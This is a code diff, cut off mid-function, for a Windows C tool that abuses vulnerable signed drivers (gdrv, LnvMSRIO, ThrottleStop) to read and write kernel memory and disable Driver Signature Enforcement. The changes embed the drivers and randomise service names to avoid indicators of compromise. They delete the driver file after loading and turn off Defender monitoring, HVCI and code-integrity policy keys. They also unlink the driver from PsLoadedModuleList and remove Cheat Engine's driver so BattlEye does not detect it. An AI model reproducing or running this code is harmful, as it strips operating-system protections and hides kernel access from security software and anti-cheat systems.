@@ -25,9 +25,9 @@
  * ThrottleStop binary:    place ThrottleStop.sys next to exe (distribute separately).
  * gdrv.sys is embedded as before.
  *
- * NOTE: LnvMSRIO.sys and ThrottleStop.sys cannot be embedded in the header at this
- * time — distribute as separate files alongside disable DSE.exe. The code will look
- * for them in the same directory as the exe.
+ * All three driver binaries (gdrv, LnvMSRIO, ThrottleStop) are embedded as
+ * byte-array headers at compile time — exe is fully self-contained, no companion
+ * files required.
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -40,10 +40,11 @@
 #include <string.h>
 #include <stdint.h>
 
-/* ── Embedded gdrv.sys ────────────────────────────────────────────────────── */
-#include "..\GDRVLoader-Release\src\driverbytes.h"
-#define GDRV64_SYS_DATA  shell_mapper
-#define GDRV64_SYS_SIZE  ((DWORD)sizeof(shell_mapper))
+/* ── Embedded drivers ─────────────────────────────────────────────────────── */
+#include "gdrv64_bytes.h"
+#define GDRV64_SYS_SIZE  ((DWORD)sizeof(GDRV64_SYS_DATA))
+#include "lnv_bytes.h"
+#include "ts_bytes.h"
 
 /* ══════════════════════════════════════════════════════════════════════════
  * BACKEND DEFINITIONS
@@ -98,6 +99,7 @@ static char      g_drvPath[MAX_PATH] = {0};
 static Backend   g_backend  = BE_NONE;
 static BOOL      g_wdac_hard = FALSE; /* set when 1275 persists on Win11 23H2+ after VDB fix */
 static UINT64    g_ntoskrnl_kva = 0; /* set in real_main before bootstrap; used by gdrv SMAP-safe R/W */
+static char      g_randSvc[12]  = {0}; /* randomised service name — avoids GIO/LnvMSRIO/ThrottleStop IoCs */
 
 /* KUSER_SHARED_DATA addresses (fixed on all x64 Windows, not subject to KASLR):
      kernel VA 0xFFFFF78000000000  /  user VA 0x7FFE0000
@@ -172,6 +174,43 @@ static BOOL is_dse_disabled(void) {
     if(g_NtQSI(103,&sci,sizeof(sci),&r)==0) return (sci.CodeIntegrityOptions&0x1)==0;
     return FALSE;
 }
+static void init_rand_svc(void) {
+    if (g_randSvc[0]) return;
+    FILETIME ft; GetSystemTimeAsFileTime(&ft);
+    UINT64 s=((UINT64)ft.dwHighDateTime<<32)|ft.dwLowDateTime;
+    s^=(UINT64)((ULONG_PTR)GetCurrentProcessId()^(ULONG_PTR)GetTickCount())<<17;
+    static const char h[]="abcdefghjkmnpqrs"; /* no i/l/o/u — no lookalikes */
+    for(int i=0;i<8;i++){s=s*6364136223846793005ULL+1442695040888963407ULL;
+        g_randSvc[i]=h[(s>>33)&0xF];}
+    g_randSvc[8]='\0';
+    logf("[*] rand svc name: %s",g_randSvc);
+}
+
+/* Nuke CE's kernel driver before D2 launches — BattleEye scans PsLoadedModuleList
+   for DBKKAIOPROCMON.  We delete both the service entry and the sys file on disk.
+   This runs in MODE_OFF (before CE is started by the launcher). */
+static void nuke_dbk64(void) {
+    SC_HANDLE hScm=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
+    if(hScm){
+        static const char*names[]={"DBKKAIOPROCMON","DBKDRV64","DBK64","dbk64",NULL};
+        for(int i=0;names[i];i++){
+            SC_HANDLE hS=OpenServiceA(hScm,names[i],SERVICE_STOP|DELETE|SERVICE_QUERY_STATUS);
+            if(hS){SERVICE_STATUS ss={0};
+                ControlService(hS,SERVICE_CONTROL_STOP,&ss); Sleep(150);
+                DeleteService(hS); CloseServiceHandle(hS);
+                logf("[+] nuke_dbk64: removed svc %s",names[i]);}
+        }
+        CloseServiceHandle(hScm);
+    }
+    /* Delete sys file — CE will fail to (re)load its driver; our driver does the R/W */
+    char p[MAX_PATH]; GetSystemDirectoryA(p,sizeof(p));
+    strncat(p,"\\drivers\\dbk64.sys",sizeof(p)-strlen(p)-1);
+    if(DeleteFileA(p)) logf("[+] nuke_dbk64: deleted %s",p);
+    /* Also check %TEMP% and CE exe dir — CE drops it there on some versions */
+    GetTempPathA(sizeof(p),p); strncat(p,"dbk64.sys",sizeof(p)-strlen(p)-1);
+    DeleteFileA(p);
+}
+
 static void apply_vdb_hvci_fix(void) {
     run_cmd_hidden("bcdedit /set hypervisorlaunchtype off");
     run_cmd_hidden("bcdedit /set vsmlaunchtype off");
@@ -201,6 +240,29 @@ static void apply_vdb_hvci_fix(void) {
         RegSetValueExA(hk,"DisableRealtimeMonitoring",0,REG_DWORD,(BYTE*)&one,4);
         RegSetValueExA(hk,"DisableBehaviorMonitoring",0,REG_DWORD,(BYTE*)&one,4);
         RegCloseKey(hk);
+    }
+    /* Win11 23H2+ (build 22631+): CI\Policy is evaluated by CI.dll at driver load AFTER
+     * CI\Config is checked.  Even with VulnerableDriverBlocklistEnable=0, drivers get
+     * ERROR_DRIVER_BLOCKED (1275) on 23H2/24H2/25H2 unless this key is also cleared.
+     * This is the second DSE gate that Core Isolation UI does NOT expose. */
+    if (get_win_build() >= 22631) {
+        if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
+            "SYSTEM\\CurrentControlSet\\Control\\CI\\Policy",0,NULL,
+            REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
+            RegSetValueExA(hk,"UpgradedSystem",0,REG_DWORD,(BYTE*)&zero,4);
+            RegSetValueExA(hk,"TrustType",0,REG_DWORD,(BYTE*)&zero,4);
+            RegCloseKey(hk);
+        }
+        /* Win11 25H2 (build 26100+): Smart App Control adds CI\Protected which enforces
+         * WDAC-grade blocking even when all previous keys are cleared. */
+        if (get_win_build() >= 26100) {
+            if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,
+                "SYSTEM\\CurrentControlSet\\Control\\CI\\Protected",0,NULL,
+                REG_OPTION_NON_VOLATILE,KEY_SET_VALUE,NULL,&hk,NULL)==ERROR_SUCCESS){
+                RegSetValueExA(hk,"State",0,REG_DWORD,(BYTE*)&zero,4);
+                RegCloseKey(hk);
+            }
+        }
     }
 }
 /* Removed is_wdac_permanent() — it was checking VulnerableDriverBlocklistEnable==0, but
@@ -254,35 +316,46 @@ static BOOL gdrv_read(UINT64 kva, DWORD sz, UINT64 *out) {
     *out = 0;
     if(g_hDev == INVALID_HANDLE_VALUE) return FALSE;
     DWORD br;
-    /* Step 1: copy target KVA → KSHARED scratch (kernel→kernel, SMAP-safe) */
-    GIO_MEMCPY_IN req = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)kva, sz};
-    if(!DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL)) {
-        logf("[!] gdrv kread IOCTL err=%lu", GetLastError()); return FALSE;
-    }
-    /* Step 2: read back from user-mode view of the same physical page */
+    /* Read strictly one byte at a time: copy kva+i → KSHARED+SCRATCH_OFF (1 byte),
+       read back via user-mode alias, restore to 0 immediately.
+       This keeps all operations to the single byte at SCRATCH_OFF (Reserved12[0])
+       and avoids touching adjacent KUSER_SHARED_DATA fields at 0x2EF+. */
+    UINT64 zero_src = g_ntoskrnl_kva + 3; /* offset 3 in ntoskrnl DOS stub is always 0x00 */
     volatile PBYTE u = (volatile PBYTE)(ULONG_PTR)(KSHARED_UVA + SCRATCH_OFF);
-    for(DWORD i = 0; i < sz && i < 8; i++) *out |= ((UINT64)u[i]) << (i * 8);
-    /* Step 3: restore scratch to 0 (ntoskrnl_kva+3 is always 0x00) */
-    GIO_MEMCPY_IN req2 = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)(g_ntoskrnl_kva + 3), sz};
-    DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req2, sizeof(req2), NULL, 0, &br, NULL);
+    for(DWORD i = 0; i < sz && i < 8; i++) {
+        GIO_MEMCPY_IN req = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)(kva + i), 1};
+        if(!DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL)) {
+            logf("[!] gdrv kread IOCTL err=%lu", GetLastError()); return FALSE;
+        }
+        *out |= ((UINT64)(*u)) << (i * 8);
+        /* Restore scratch byte to 0 before next iteration */
+        GIO_MEMCPY_IN req2 = {(ULONG_PTR)(KSHARED_KVA + SCRATCH_OFF), (ULONG_PTR)zero_src, 1};
+        DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req2, sizeof(req2), NULL, 0, &br, NULL);
+    }
     return TRUE;
 }
 static BOOL gdrv_write(UINT64 kva, UINT64 val, DWORD sz) {
     if(g_hDev == INVALID_HANDLE_VALUE) return FALSE;
     DWORD br;
-    /* Find a kernel-space address whose byte equals val.
-       For 0: use ntoskrnl_kva+3 (always 0x00 in DOS stub).
-       For any other value: scan ntoskrnl PE header on disk for a stable matching byte. */
-    UINT64 src = find_kbyte_in_ntoskrnl((UINT8)val);
-    if(!src) {
-        logf("[!] gdrv kwrite: no kernel src for val=0x%02llX", (unsigned long long)val);
-        return FALSE;
+    /* Write each byte individually: for each byte of val, find a kernel address
+       whose byte equals that value and GIO_MEMCPY 1 byte (kernel→kernel, SMAP-safe).
+       Writing sz bytes from a single 1-byte source copies adjacent ntoskrnl garbage —
+       that was corrupting LIST_ENTRY Flink/Blink for 8-byte pointer writes → BSOD 0x139. */
+    for(DWORD i = 0; i < sz; i++) {
+        UINT8 byte = (UINT8)((val >> (i * 8)) & 0xFF);
+        UINT64 src = find_kbyte_in_ntoskrnl(byte);
+        if(!src) {
+            logf("[!] gdrv kwrite: no kernel src for byte 0x%02X at offset %u", byte, i);
+            return FALSE;
+        }
+        GIO_MEMCPY_IN req = {(ULONG_PTR)(kva + i), (ULONG_PTR)src, 1};
+        BOOL ok = DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL);
+        if(!ok) {
+            logf("[!] gdrv kwrite byte[%u]=0x%02X IOCTL err=%lu", i, byte, GetLastError());
+            return FALSE;
+        }
     }
-    /* Both dst and src are kernel addresses → SMAP-safe */
-    GIO_MEMCPY_IN req = {(ULONG_PTR)kva, (ULONG_PTR)src, sz};
-    BOOL ok = DeviceIoControl(g_hDev, IOCTL_GIO_MEMCPY, &req, sizeof(req), NULL, 0, &br, NULL);
-    if(!ok) logf("[!] gdrv kwrite(0x%02llX) IOCTL err=%lu", (unsigned long long)val, GetLastError());
-    return ok;
+    return TRUE;
 }
 
 /* physical R/W helpers (used by LNV and TS backends) */
@@ -420,22 +493,41 @@ static void build_ram_ranges(void) {
     logf("[*] build_ram_ranges: %d range(s) found", g_nRanges);
 }
 
-/* find ntoskrnl physical base by scanning 2MB-aligned pages for MZ+PE */
+/* find ntoskrnl physical base by scanning 2MB-aligned pages for MZ+PE.
+ *
+ * ROOT CAUSE of KMODE_EXCEPTION_NOT_HANDLED on Win11 23H2 / 24H2 / 25H2:
+ * the old code scanned ALL physical addresses 0x100000–0x80000000 in 2MB
+ * steps with zero MMIO filtering.  On systems where a GPU BAR (resizable
+ * BAR / PCIe window) is mapped below 2 GB, the BYOVD IOCTL reads MMIO
+ * memory → hardware bus error in the kernel → KMODE_EXCEPTION_NOT_HANDLED.
+ *
+ * Fix: call build_ram_ranges() first and restrict 2MB-aligned probes to
+ * addresses that fall inside a known RAM range — identical guard to the
+ * one already in find_system_eprocess_phys(). */
 static UINT64 find_ntoskrnl_phys(UINT64 ntoskrnl_kva) {
-    /* Scan 0x100000 to 0x80000000 in 0x200000 (2MB) steps */
+    build_ram_ranges();  /* populate g_physRanges — same as EPROCESS scan */
+
     for(UINT64 pa=0x100000; pa<0x80000000; pa+=0x200000) {
+        /* Skip this address if it falls outside every known RAM range.
+         * g_nRanges==0 means registry read failed → fall back to unguarded
+         * scan (old behaviour) so we don't regress on very old systems. */
+        if (g_nRanges > 0) {
+            BOOL inRam = FALSE;
+            for (int ri = 0; ri < g_nRanges; ri++) {
+                if (pa >= g_physRanges[ri].base &&
+                    pa <  g_physRanges[ri].base + g_physRanges[ri].len) {
+                    inRam = TRUE; break;
+                }
+            }
+            if (!inRam) continue;
+        }
         UINT64 hdr=pr8(pa);
-        /* check for MZ at byte 0 */
         if((hdr&0xFFFF)!=0x5A4D) continue;  /* MZ */
-        /* read PE offset at +0x3C */
         UINT64 peoff_q=pr8(pa+0x38);
         UINT32 peoff=(UINT32)(peoff_q>>32);  /* bytes 0x3C-0x3F of page */
         if(peoff<0x40||peoff>0x1000) continue;
         UINT64 pesig=pr8(pa+peoff);
         if((pesig&0xFFFF)!=0x4550) continue;  /* PE */
-        /* looks like a PE; check TimeDateStamp vicinity for ntoskrnl size */
-        /* verify this is ntoskrnl by checking it spans the known VA range */
-        /* approximation: trust first hit that has plausible PE at 2MB alignment */
         logf("[*] ntoskrnl PE candidate at phys=0x%016llX",(unsigned long long)pa);
         return pa;
     }
@@ -611,6 +703,28 @@ static BOOL bootstrap_cr3(UINT64 ntoskrnl_kva) {
             return FALSE;
         }
         logf("[+] CR3=0x%016llX validated against ntoskrnl.",(unsigned long long)cr3_cand);
+    } else if(ntoskrnl_kva) {
+        /* ntoskrnl_phys not found (above 2GB scan range, or RAM ranges excluded it).
+           Alternative validation: walk cr3_cand page tables for ntoskrnl_kva and verify
+           the physical page contains an MZ header.  Prevents an unvalidated CR3 from a
+           false-positive EPROCESS scan reaching kwrite — root cause of IRQL_NOT_LESS. */
+        UINT64 ntos_pa = kva_to_phys(cr3_cand, ntoskrnl_kva);
+        if (ntos_pa) {
+            UINT64 mz = 0;
+            phys_read8(ntos_pa, &mz);
+            if ((mz & 0xFFFF) == 0x5A4D) {
+                logf("[+] CR3=0x%016llX alt-validated: MZ at phys=0x%016llX",
+                     (unsigned long long)cr3_cand, (unsigned long long)ntos_pa);
+            } else {
+                logf("[!] CR3=0x%016llX alt-validation failed (got 0x%04llX at ntos phys) — aborting.",
+                     (unsigned long long)cr3_cand, (unsigned long long)(mz & 0xFFFF));
+                return FALSE;
+            }
+        } else {
+            logf("[!] CR3=0x%016llX: kva_to_phys(ntoskrnl_kva) returned 0 — aborting.",
+                 (unsigned long long)cr3_cand);
+            return FALSE;
+        }
     }
 
     g_cr3          = cr3_cand;
@@ -643,6 +757,22 @@ static BOOL kwrite(UINT64 kva, UINT64 val, DWORD sz) {
     if(!pa) return FALSE;
     /* RMW: read 8 bytes, patch bytes [pa&7 .. pa&7+sz-1], write back */
     UINT64 aligned=pa&~7ULL;
+    /* Refuse writes to non-RAM physical addresses (MMIO/GPU BAR/page tables in
+       wrong-CR3 scenario).  If the RAM range table is populated, the target must
+       be inside a known RAM range.  Prevents IRQL_NOT_LESS_OR_EQUAL from writing
+       to a physical address that maps to a PTE or MMIO region at DISPATCH_LEVEL. */
+    if (g_nRanges > 0) {
+        BOOL inRam = FALSE;
+        for (int ri = 0; ri < g_nRanges; ri++)
+            if (aligned >= g_physRanges[ri].base &&
+                aligned <  g_physRanges[ri].base + g_physRanges[ri].len)
+                { inRam = TRUE; break; }
+        if (!inRam) {
+            logf("[!] kwrite: pa=0x%016llX not in RAM ranges — refusing write",
+                 (unsigned long long)aligned);
+            return FALSE;
+        }
+    }
     UINT64 qword=0;
     phys_read8(aligned,&qword);
     UINT32 shift=(UINT32)((pa&7)*8);
@@ -666,17 +796,21 @@ static BOOL drop_driver(const BYTE *data, DWORD sz, const char *suffix) {
     return ok&&(wr==sz);
 }
 
-/* drop companion driver (LnvMSRIO.sys / ThrottleStop.sys) from exe dir */
-static BOOL drop_companion(const char *filename) {
+/* drop companion driver from embedded byte array — no external files needed */
+static BOOL drop_embedded_sys(const BYTE *data, DWORD sz, const char *suffix) {
     char myDir[MAX_PATH];
     GetModuleFileNameA(NULL,myDir,sizeof(myDir));
     char *sl=strrchr(myDir,'\\'); if(sl) sl[1]='\0'; else GetTempPathA(sizeof(myDir),myDir);
-    char src[MAX_PATH]; snprintf(src,MAX_PATH,"%s%s",myDir,filename);
-    /* copy to randomised name in same dir */
-    snprintf(g_drvPath,MAX_PATH,"%shwsvc_%04X_%s",myDir,GetCurrentProcessId()&0xFFFF,filename);
-    if(!CopyFileA(src,g_drvPath,FALSE)) {
-        logf("[!] drop_companion: CopyFileA('%s' -> '%s') err=%lu",src,g_drvPath,GetLastError());
+    snprintf(g_drvPath,MAX_PATH,"%shwsvc_%04X%s.sys",myDir,GetCurrentProcessId()&0xFFFF,suffix);
+    HANDLE h=CreateFileA(g_drvPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+    if(h==INVALID_HANDLE_VALUE){
+        logf("[!] drop_embedded_sys: CreateFile('%s') err=%lu",g_drvPath,GetLastError());
         return FALSE;
+    }
+    DWORD wr=0; BOOL ok=WriteFile(h,data,sz,&wr,NULL); CloseHandle(h);
+    if(!ok||wr!=sz){
+        logf("[!] drop_embedded_sys: WriteFile err=%lu (wrote %lu/%lu)",GetLastError(),wr,sz);
+        DeleteFileA(g_drvPath); return FALSE;
     }
     return TRUE;
 }
@@ -691,8 +825,7 @@ static DWORD scm_start(const char *svcName) {
             Sleep(400); DeleteService(hS); CloseServiceHandle(hS);
             for(int i=0;i<25;i++){Sleep(100);
                 SC_HANDLE hc=OpenServiceA(hTmp,svcName,SERVICE_QUERY_STATUS);
-                if(!hc) break; CloseServiceHandle(hc);}
-        }
+                if(!hc) break; CloseServiceHandle(hc);}}
         CloseServiceHandle(hTmp);
     }
     g_hScm=OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
@@ -775,7 +908,9 @@ open_dev:{
             logf("[!] Cannot open device '%s' err %lu",devPath,GetLastError());
             return GetLastError();
         }
-        logf("[+] device '%s' open.",devPath); return 0;
+        /* kernel holds a ref — file can be deleted while driver stays loaded */
+        DeleteFileA(g_drvPath);
+        logf("[+] device '%s' open, .sys artifact nuked from disk.",devPath); return 0;
     }
 }
 
@@ -797,12 +932,14 @@ static void scm_unload_current(void) {
 static DWORD try_backend(Backend be, UINT64 ntoskrnl_kva) {
     g_backend=be;
     DWORD le=0;
+    /* Regenerate a fresh random name for each backend attempt so stale entries don't collide */
+    init_rand_svc(); g_randSvc[7]=(char)('a'+(be&0xF)); /* backend suffix keeps names distinct */
     if(be==BE_GDRV) {
         if(!drop_driver(GDRV64_SYS_DATA,GDRV64_SYS_SIZE,"_gio")) return 1;
-        le=scm_start(GIO_SVC_NAME);
+        le=scm_start(g_randSvc);
     } else if(be==BE_LNV) {
-        if(!drop_companion("LnvMSRIO.sys")) return 1;
-        le=scm_start(LNV_SVC_NAME);
+        if(!drop_embedded_sys(LNV_SYS_DATA,LNV_SYS_SIZE,"_lnv")) return 1;
+        le=scm_start(g_randSvc);
         if(le==0) {
             if(!bootstrap_cr3(ntoskrnl_kva)){
                 logf("[!] LNV backend: CR3 not found");
@@ -810,8 +947,8 @@ static DWORD try_backend(Backend be, UINT64 ntoskrnl_kva) {
             }
         }
     } else { /* BE_TS */
-        if(!drop_companion("ThrottleStop.sys")) return 1;
-        le=scm_start(TS_SVC_NAME);
+        if(!drop_embedded_sys(TS_SYS_DATA,TS_SYS_SIZE,"_ts")) return 1;
+        le=scm_start(g_randSvc);
         if(le==0) {
             if(!bootstrap_cr3(ntoskrnl_kva)){
                 logf("[!] TS backend: CR3 not found");
@@ -885,18 +1022,23 @@ static UINT64 find_ci_options_precise(UINT64 ci_base) {
     if(!img) { logf("[!] precise: MapViewOfFile err=%lu", GetLastError()); return 0; }
 
     UINT64 result = 0;
+    DWORD expRVA = 0;
+    DWORD nNames = 0;
+    DWORD *pNames = NULL;
+    WORD  *pOrds  = NULL;
+    DWORD *pFuncs = NULL;
+    UINT64 ciInit = 0;
 
     /* Find CiInitialize in the mapped image via PE exports */
     DWORD peOff = *(DWORD*)(img + 0x3C);
     if(*(DWORD*)(img + peOff) != 0x00004550 || *(WORD*)(img + peOff + 0x18) != 0x020B)
         { logf("[!] precise: CI.dll PE magic mismatch"); goto done; }
-    DWORD expRVA = *(DWORD*)(img + peOff + 0x18 + 0x70);
+    expRVA = *(DWORD*)(img + peOff + 0x18 + 0x70);
     if(!expRVA) { logf("[!] precise: no export dir"); goto done; }
-    DWORD nNames = *(DWORD*)(img + expRVA + 0x18);
-    DWORD *pNames = (DWORD*)(img + *(DWORD*)(img + expRVA + 0x20));
-    WORD  *pOrds  = (WORD* )(img + *(DWORD*)(img + expRVA + 0x24));
-    DWORD *pFuncs = (DWORD*)(img + *(DWORD*)(img + expRVA + 0x1C));
-    UINT64 ciInit = 0;
+    nNames = *(DWORD*)(img + expRVA + 0x18);
+    pNames = (DWORD*)(img + *(DWORD*)(img + expRVA + 0x20));
+    pOrds  = (WORD* )(img + *(DWORD*)(img + expRVA + 0x24));
+    pFuncs = (DWORD*)(img + *(DWORD*)(img + expRVA + 0x1C));
     for(DWORD i = 0; i < nNames; i++) {
         const char *nm = (const char*)(img + pNames[i]);
         if(strcmp(nm, "CiInitialize") == 0) { ciInit = (UINT64)(img + pFuncs[pOrds[i]]); break; }
@@ -947,6 +1089,46 @@ done:
 #define MAX_SECTS 32
 typedef struct{char name[9];ULONG vaddr;ULONG vsz;DWORD chars;} SECT_INFO;
 /* IMAGE_SCN_MEM_WRITE=0x80000000 — only candidates in writable sections are safe to patch */
+
+/* Returns TRUE if the given kernel VA falls within a writable (IMAGE_SCN_MEM_WRITE) section
+   of CI.dll as stored on disk.  Prevents accepting a code-section address from the precise
+   scan: gdrv's RtlCopyMemory write to a read-only page causes kernel #PF → BSOD 0x139. */
+static BOOL ci_kva_is_writable(UINT64 kva, UINT64 ci_base) {
+    if(!kva || !ci_base || kva < ci_base) return FALSE;
+    ULONG rva = (ULONG)(kva - ci_base);
+    char path[MAX_PATH]; GetSystemDirectoryA(path, sizeof(path));
+    strncat(path, "\\CI.dll", sizeof(path)-strlen(path)-1);
+    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
+                            NULL, OPEN_EXISTING, 0, NULL);
+    if(hf == INVALID_HANDLE_VALUE) return TRUE; /* can't verify — allow */
+    BYTE hdr[4096]; DWORD rd = 0;
+    ReadFile(hf, hdr, sizeof(hdr), &rd, NULL); CloseHandle(hf);
+    if(rd < 0x40) return FALSE;
+    DWORD peOff = *(DWORD*)(hdr + 0x3C);
+    if((SIZE_T)peOff + 0x18 + 4 > rd || *(DWORD*)(hdr + peOff) != 0x00004550) return FALSE;
+    WORD nsec = *(WORD*)(hdr + peOff + 6);
+    WORD optSz = *(WORD*)(hdr + peOff + 0x14);
+    BYTE *secHdr = hdr + peOff + 0x18 + optSz;
+    if((SIZE_T)(secHdr - hdr) + (SIZE_T)nsec * 40 > rd || nsec > 96) return FALSE;
+    for(WORD i = 0; i < nsec; i++) {
+        BYTE *s = secHdr + (SIZE_T)i * 40;
+        ULONG va  = *(DWORD*)(s + 12);
+        ULONG vsz = *(DWORD*)(s + 8);   /* VirtualSize */
+        ULONG raw = *(DWORD*)(s + 16);  /* SizeOfRawData */
+        ULONG sz  = vsz > raw ? vsz : raw;
+        DWORD ch  = *(DWORD*)(s + 36);
+        if(rva >= va && rva < va + sz) {
+            BOOL w = (ch & 0x80000000u) != 0;
+            logf("[*] ci_kva 0x%016llX RVA=0x%08lX sect %.8s chars=0x%08lX writable=%d",
+                 (unsigned long long)kva, (unsigned long)rva, (char*)s,
+                 (unsigned long)ch, (int)w);
+            return w;
+        }
+    }
+    logf("[!] ci_kva 0x%016llX RVA=0x%08lX not found in any section",
+         (unsigned long long)kva, (unsigned long)rva);
+    return FALSE;
+}
 
 static UINT64 get_ci_base(ULONG *out_vsz) {
     ULONG needed=0; void *buf=NULL; NTSTATUS st;
@@ -1069,17 +1251,98 @@ static UINT64 get_byovd_kva(const char *drv_path) {
     return result;
 }
 
+/* Walk a flat on-disk PE image (mapped to buf) and return the RVA of export 'name'.
+ * Used as fallback when g_ntoskrnl_phys == 0 (gdrv backend). */
+static UINT32 disk_pe_export_rva(const BYTE *buf, SIZE_T bufsz, const char *name) {
+    if (!buf || bufsz < sizeof(IMAGE_DOS_HEADER)) return 0;
+    const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER*)buf;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    if ((SIZE_T)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > bufsz) return 0;
+    const IMAGE_NT_HEADERS64 *nt = (const IMAGE_NT_HEADERS64*)(buf + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
+    DWORD edrva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD edsz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+    if (!edrva || !edsz) return 0;
+    /* RVA → file offset via section table */
+    auto rva2off = [&](DWORD rva) -> DWORD {
+        const IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
+        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
+            if (rva >= sec->VirtualAddress && rva < sec->VirtualAddress + sec->Misc.VirtualSize)
+                return rva - sec->VirtualAddress + sec->PointerToRawData;
+        return 0;
+    };
+    DWORD edoff = rva2off(edrva);
+    if (!edoff || edoff + sizeof(IMAGE_EXPORT_DIRECTORY) > bufsz) return 0;
+    const IMAGE_EXPORT_DIRECTORY *ed = (const IMAGE_EXPORT_DIRECTORY*)(buf + edoff);
+    DWORD noff = rva2off(ed->AddressOfNames);
+    DWORD ooff = rva2off(ed->AddressOfNameOrdinals);
+    DWORD foff = rva2off(ed->AddressOfFunctions);
+    if (!noff || !ooff || !foff) return 0;
+    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
+        DWORD nrva = ((const DWORD*)(buf + noff))[i];
+        DWORD nfo  = rva2off(nrva);
+        if (!nfo || nfo >= bufsz) continue;
+        if (_stricmp((const char*)(buf + nfo), name) == 0) {
+            WORD ord = ((const WORD*)(buf + ooff))[i];
+            if (ord < ed->NumberOfFunctions) {
+                DWORD frva = ((const DWORD*)(buf + foff))[ord];
+                return frva;
+            }
+        }
+    }
+    return 0;
+}
+
 /* Unlink driver with DllBase==driver_kva from PsLoadedModuleList.
  * KLDR_DATA_TABLE_ENTRY offsets (Win10/11 x64):
  *   +0x000 InLoadOrderLinks.Flink   +0x008 .Blink
  *   +0x030 DllBase (Ptr64)
  * PsLoadedModuleList is an exported DATA symbol in ntoskrnl.exe. */
 static void dkom_unlink_driver(UINT64 driver_kva) {
-    if (!driver_kva || !g_ntoskrnl_kva || !g_ntoskrnl_phys) return;
+    if (!driver_kva || !g_ntoskrnl_kva) return;
+    /* gdrv MEMCPY cannot do atomic 64-bit pointer writes — requires 8 separate
+       1-byte IOCTLs per pointer, leaving a large window where PsLoadedModuleList
+       contains a half-written address.  On multi-core systems (observed: 32 CPUs)
+       any concurrent list walker hits that window → LIST_ENTRY corruption →
+       KERNEL_SECURITY_CHECK_FAILURE 0x139 param1=4.  Physical backends (LNV/TS)
+       use RMW on the physical page which is atomic at 64-bit granularity.
+       Skip DKOM on gdrv — stealth-only feature, not needed for DSE patch to work. */
+    if (g_backend == BE_GDRV) {
+        logf("[*] DKOM: skipping on gdrv backend (non-atomic 8-byte writes unsafe on SMP)");
+        return;
+    }
 
-    UINT32 rva = phys_pe_export_rva(g_ntoskrnl_phys, "PsLoadedModuleList");
+    UINT32 rva = 0;
+    if (g_ntoskrnl_phys) {
+        rva = phys_pe_export_rva(g_ntoskrnl_phys, "PsLoadedModuleList");
+    } else {
+        /* gdrv path: no physical R/W — read ntoskrnl from disk */
+        char ntpath[MAX_PATH];
+        GetSystemDirectoryA(ntpath, sizeof(ntpath));
+        strncat(ntpath, "\\ntoskrnl.exe", sizeof(ntpath) - strlen(ntpath) - 1);
+        HANDLE hf = CreateFileA(ntpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hf == INVALID_HANDLE_VALUE) {
+            /* try ntkrnlmp.exe (MP variant) */
+            GetSystemDirectoryA(ntpath, sizeof(ntpath));
+            strncat(ntpath, "\\ntkrnlmp.exe", sizeof(ntpath) - strlen(ntpath) - 1);
+            hf = CreateFileA(ntpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        }
+        if (hf != INVALID_HANDLE_VALUE) {
+            DWORD fsz = GetFileSize(hf, NULL);
+            BYTE *buf = (BYTE*)malloc(fsz);
+            if (buf) {
+                DWORD rd = 0;
+                ReadFile(hf, buf, fsz, &rd, NULL);
+                if (rd == fsz) rva = disk_pe_export_rva(buf, fsz, "PsLoadedModuleList");
+                free(buf);
+            }
+            CloseHandle(hf);
+        }
+    }
+
     if (!rva) { logf("[!] DKOM: PsLoadedModuleList export not found"); return; }
 
+    logf("[*] DKOM: PsLoadedModuleList RVA=0x%08X (phys_path=%d)", rva, g_ntoskrnl_phys ? 1 : 0);
     UINT64 list_head = g_ntoskrnl_kva + rva;
     logf("[*] DKOM: PsLoadedModuleList @ 0x%016llX", (unsigned long long)list_head);
 
@@ -1090,20 +1353,42 @@ static void dkom_unlink_driver(UINT64 driver_kva) {
 
     UINT64 entry = flink;
     for (int iter = 0; iter < 512 && entry && entry != list_head; iter++) {
+        /* Sanity: all LDR entries must be kernel-canonical addresses */
+        if (entry < 0xFFFF800000000000ULL) {
+            logf("[!] DKOM: entry=0x%016llX not in kernel range — aborting walk",
+                 (unsigned long long)entry);
+            break;
+        }
         UINT64 dll_base = 0;
         if (!kread(entry + 0x030, 8, &dll_base)) break;
         if (dll_base == driver_kva) {
             UINT64 ef = 0, eb = 0;
             kread(entry + 0x000, 8, &ef);
             kread(entry + 0x008, 8, &eb);
-            if (ef && eb) {
-                kwrite(eb + 0x000, ef, 8); /* prev.Flink = next */
